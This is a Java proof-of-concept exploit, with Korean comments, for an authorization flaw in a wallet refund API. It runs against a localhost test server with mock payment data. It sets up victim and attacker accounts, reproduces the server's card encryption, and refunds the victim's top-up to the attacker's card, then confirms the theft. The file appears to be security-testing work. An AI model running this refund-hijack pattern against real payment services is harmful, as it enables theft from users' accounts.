import java.net.URI;
import java.net.http.*;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.MGF1ParameterSpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.regex.*;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.OAEPParameterSpec;
import javax.crypto.spec.PSource;

/**
 * VULN-WALLET-7 PoC — 공격자 카드로 탈취 계정 잔액 환불 수취.
 * 순수 JDK만 사용(외부 라이브러리 없음). 서버의 카드 E2E 암호화(RSA-OAEP+AES-GCM)를 그대로 재현.
 */
public class Poc {
    static final String BASE = "http://localhost:8080/api";
    static final HttpClient HTTP = HttpClient.newHttpClient();

    public static void main(String[] args) throws Exception {
        String uniq = String.valueOf(System.currentTimeMillis()).substring(7);
        String victimId = "victim" + uniq;
        String attackerId = "attacker" + uniq;

        System.out.println("================ VULN-WALLET-7 PoC ================");

        // --- 1) 계정 생성 + 로그인 ---
        signup(victimId, "피해자", "01011110000", "1990-01-01");
        signup(attackerId, "공격자", "01022220000", "1988-08-08");
        String vTok = login(victimId);
        String aTok = login(attackerId);
        System.out.println("[1] 피해자/공격자 계정 생성·로그인 완료");

        // --- 2) 피해자: 실명확인 + 결제비번(충전 관문) ---
        identityVerify(vTok, "피해자", "900101", "9001011234567");
        paymentPwSetup(vTok, "1234");
        System.out.println("[2] 피해자 실명확인·결제비밀번호 설정 완료");

        // --- 3) 피해자: 5만원 충전 ---
        String otp = otpIssue(vTok);
        String muid = chargePrepare(vTok, 50000, otp, "1234", "nonce-v-" + uniq);
        long vBalAfterCharge = chargeApprove(vTok, muid, 50000);
        System.out.println("[3] 피해자 충전 완료: merchantUid=" + muid + ", 잔액=" + vBalAfterCharge + "원");

        // --- 4) 공격자: 실명확인 + 결제비번 + 자기 카드 등록 ---
        identityVerify(aTok, "공격자", "880808", "8808081234567");
        paymentPwSetup(aTok, "4321");
        long attackerCardId = registerCard(aTok, "4321", "공격자");
        System.out.println("[4] 공격자 카드 등록 완료: cardId=" + attackerCardId);

        // --- 5) 공격 실행: 공격자 토큰으로 피해자 충전을 '공격자 카드'로 환불 ---
        System.out.println("\n>>> ATTACK: 공격자 토큰으로 피해자 merchantUid 환불 (목적지 = 공격자 cardId=" + attackerCardId + ")");
        String refundResp = refund(aTok, muid, attackerCardId);
        System.out.println("    응답: " + refundResp);

        long vBalAfterAttack = victimWalletBalance(vTok);
        String maskedCard = group(refundResp, "\"maskedCard\"\\s*:\\s*\"([^\"]*)\"");
        String pgRefundId = group(refundResp, "\"pgRefundId\"\\s*:\\s*\"([^\"]*)\"");

        System.out.println("\n================ 결과 ================");
        System.out.println(" 피해자 충전 후 잔액   : " + vBalAfterCharge + "원");
        System.out.println(" 공격 후 피해자 잔액   : " + vBalAfterAttack + "원   (차감됨 = 자금 탈취)");
        System.out.println(" 환불 수취 카드(mock PG): " + maskedCard + "  <- 공격자 카드");
        System.out.println(" PG 환불 거래ID(mock)  : " + pgRefundId);
        boolean pwned = vBalAfterAttack == 0 && maskedCard != null && !maskedCard.isBlank();
        System.out.println("\n [" + (pwned ? "취약점 재현 성공" : "실패") + "] 공격자 토큰 + 공격자 카드로 피해자 잔액을 환불 수취했다.");
    }

    // ---------------- HTTP helpers ----------------
    static String post(String path, String token, String json) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(BASE + path))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8));
        if (token != null) b.header("Authorization", "Bearer " + token);
        HttpResponse<String> r = HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
        if (r.statusCode() / 100 != 2) throw new RuntimeException("POST " + path + " -> " + r.statusCode() + " " + r.body());
        return r.body();
    }
    static String get(String path, String token) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(BASE + path)).GET();
        if (token != null) b.header("Authorization", "Bearer " + token);
        HttpResponse<String> r = HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
        if (r.statusCode() / 100 != 2) throw new RuntimeException("GET " + path + " -> " + r.statusCode() + " " + r.body());
        return r.body();
    }
    static String group(String s, String re) {
        Matcher m = Pattern.compile(re).matcher(s);
        return m.find() ? m.group(1) : null;
    }

    // ---------------- flows ----------------
    static void signup(String loginId, String name, String phone, String birth) throws Exception {
        String body = "{\"loginId\":\"" + loginId + "\",\"username\":\"" + name + "\",\"password\":\"Passw0rd!\","
                + "\"nickname\":\"" + name + "\",\"email\":\"" + loginId + "@x.com\",\"phoneNumber\":\"" + phone + "\","
                + "\"birthDate\":\"" + birth + "\",\"role\":\"PARENT\"}";
        post("/auth/signup", null, body);
    }
    static String login(String loginId) throws Exception {
        String r = post("/auth/login", null, "{\"loginId\":\"" + loginId + "\",\"password\":\"Passw0rd!\"}");
        return group(r, "\"token\"\\s*:\\s*\"([^\"]+)\"");
    }
    static void identityVerify(String tok, String name, String birth6, String idNum13) throws Exception {
        String body = "{\"name\":\"" + name + "\",\"birthDate\":\"" + birth6 + "\",\"idType\":\"RESIDENT\","
                + "\"idNumber\":\"" + idNum13 + "\",\"issuedDate\":\"2015-03-01\"}";
        post("/efin/identity/verify", tok, body);
    }
    static void paymentPwSetup(String tok, String pw) throws Exception {
        post("/efin/payment-password/setup", tok, "{\"password\":\"" + pw + "\"}");
    }
    static String otpIssue(String tok) throws Exception {
        String r = post("/efin/otp/issue", tok, "{}");
        return group(r, "\"code\"\\s*:\\s*\"?([0-9]{6})\"?");
    }
    static String chargePrepare(String tok, int amount, String otp, String pw, String nonce) throws Exception {
        String body = "{\"amount\":" + amount + ",\"otp\":\"" + otp + "\",\"paymentPassword\":\"" + pw + "\",\"nonce\":\"" + nonce + "\"}";
        String r = post("/wallet/charge/prepare", tok, body);
        return group(r, "\"merchantUid\"\\s*:\\s*\"([^\"]+)\"");
    }
    static long chargeApprove(String tok, String muid, int amount) throws Exception {
        String r = post("/wallet/charge/approve", tok, "{\"merchantUid\":\"" + muid + "\",\"amount\":" + amount + "}");
        return Long.parseLong(group(r, "\"balance\"\\s*:\\s*([0-9]+)"));
    }
    static long victimWalletBalance(String tok) throws Exception {
        // transactions 최신 1건의 balanceAfter 로 확인 (REFUND 반영)
        String r = get("/wallet/transactions?page=0&size=1", tok);
        String b = group(r, "\"balanceAfter\"\\s*:\\s*([0-9]+)");
        return b == null ? -1 : Long.parseLong(b);
    }
    static String refund(String tok, String muid, long cardId) throws Exception {
        return post("/wallet/charge/" + muid + "/refund", tok, "{\"cardId\":" + cardId + "}");
    }

    static long registerCard(String tok, String paymentPw, String ownerName) throws Exception {
        String pk = get("/wallet/cards/public-key", tok);
        String keyId = group(pk, "\"keyId\"\\s*:\\s*\"([^\"]+)\"");
        String pubB64 = group(pk, "\"publicKey\"\\s*:\\s*\"([^\"]+)\"");

        long ts = System.currentTimeMillis();
        String nonce = "card-nonce-" + ts;
        String payload = "{\"cardNumber\":\"4111111111111111\",\"expiry\":\"05/28\",\"cvc\":\"123\","
                + "\"passwordFront\":\"12\",\"birthDate\":\"880808\",\"ownerName\":\"" + ownerName + "\","
                + "\"paymentPassword\":\"" + paymentPw + "\",\"nonce\":\"" + nonce + "\",\"timestamp\":" + ts + "}";

        // AES-256 key + AES-GCM(12B IV, 128-bit tag)
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256);
        SecretKey aes = kg.generateKey();
        byte[] iv = new byte[12];
        new java.security.SecureRandom().nextBytes(iv);
        Cipher gcm = Cipher.getInstance("AES/GCM/NoPadding");
        gcm.init(Cipher.ENCRYPT_MODE, aes, new GCMParameterSpec(128, iv));
        byte[] ct = gcm.doFinal(payload.getBytes(StandardCharsets.UTF_8));

        // RSA-OAEP(SHA-256/MGF1-SHA256) wrap AES key
        byte[] der = Base64.getDecoder().decode(pubB64);
        PublicKey rsaPub = KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(der));
        Cipher oaep = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        oaep.init(Cipher.ENCRYPT_MODE, rsaPub, new OAEPParameterSpec("SHA-256", "MGF1", MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT));
        byte[] wrapped = oaep.doFinal(aes.getEncoded());

        String enc = Base64.getEncoder().encodeToString(wrapped);
        String ivB64 = Base64.getEncoder().encodeToString(iv);
        String ctB64 = Base64.getEncoder().encodeToString(ct);
        String body = "{\"keyId\":\"" + keyId + "\",\"encryptedKey\":\"" + enc + "\",\"iv\":\"" + ivB64 + "\",\"ciphertext\":\"" + ctB64 + "\"}";
        String r = post("/wallet/cards", tok, body);
        return Long.parseLong(group(r, "\"id\"\\s*:\\s*([0-9]+)"));
    }
}
